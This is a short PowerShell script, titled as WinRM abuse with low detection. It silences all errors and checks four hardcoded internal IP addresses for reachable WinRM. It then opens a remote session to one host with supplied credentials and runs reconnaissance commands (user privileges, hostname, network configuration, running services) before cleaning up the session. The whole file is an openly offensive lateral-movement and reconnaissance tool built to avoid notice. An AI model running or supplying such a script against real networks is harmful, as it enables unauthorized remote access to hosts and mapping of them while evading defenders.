# ============================================
# Signed_WinRM.ps1 - WinRM abuse with low detection
# ============================================

$ErrorActionPreference = "SilentlyContinue"

# WinRM ports: 5985 HTTP / 5986 HTTPS
$targets = @(
    "10.19.8.102",
    "10.19.8.96",
    "10.19.8.5",
    "10.19.8.10"
)

# Test WinRM availability (signed test)
foreach ($t in $targets) {
    try {
        $test = Test-WSMan -ComputerName $t -ErrorAction Stop
        Write-Host "[+] WinRM reachable on $t"
    } catch {
        Write-Host "[-] WinRM NOT reachable on $t"
    }
}

# Connect with credential
$cred = Get-Credential
$session = New-PSSession -ComputerName "10.19.8.102" -Authentication Negotiate -Credential $cred

if ($session) {
    Invoke-Command -Session $session -ScriptBlock {
        whoami /all
        hostname
        ipconfig /all
        Get-Service | Where-Object {$_.Status -eq "Running"}
    }

    # Cleanup
    Remove-PSSession $session
}
